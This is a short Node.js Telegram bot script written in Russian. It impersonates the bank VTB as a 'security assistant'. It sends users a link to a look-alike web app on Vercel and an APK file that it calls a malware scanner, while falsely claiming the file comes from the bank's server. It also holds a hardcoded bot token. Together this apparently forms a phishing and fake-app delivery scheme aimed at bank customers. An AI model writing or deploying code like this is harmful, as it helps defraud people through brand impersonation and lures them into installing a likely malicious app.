const TelegramBot = require("node-telegram-bot-api");

const token = "6727445119:AAFpR3Hk_JBOevOkbCQm-LSouskqB1RMxhk";
const bot = new TelegramBot(token, { polling: true });
const webApiUrl = 'https://vtb-online-client.vercel.app/'

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const gifFilePath = './320_180.gif.gif';

  try {
    await bot.sendDocument(chatId, gifFilePath, {
      caption: `Привет! Я — Помощник ВТБ.

Бот предназначен для помощи клиентов по решению проблем с безопасностью.

В нем можно скачать приложение, которое сканирует на наличие вредоносных программ
и различных мошеннических действий на вашем устройстве`,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Сайт',
              web_app: { url: webApiUrl }
            },
            {
              text: 'Файл',
              callback_data: 'file'
            }
          ]
        ]
      }
    });
  } catch (error) {
    console.error('Ошибка отправки документа:', error);
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'file') {
    try {
      await bot.sendMessage(chatId, 'Загрузка файла с сервера банка...🌐');
      await sendFile(chatId);
    } catch (error) {
      console.error('Ошибка при обработке callback-запроса:', error);
    }
  }
});

async function sendFile(chatId) {
  const filePath = 'support-vtb-client.apk';

  try {
    await bot.sendDocument(chatId, filePath);
    console.log(`Файл успешно отправлен пользователю с chatId ${chatId}`);
  } catch (error) {
    console.error('Ошибка отправки файла:', error);
  }
}

const webhookUrl = 'https://vtb-bot.vercel.app/'
bot.setWebHook(webhookUrl);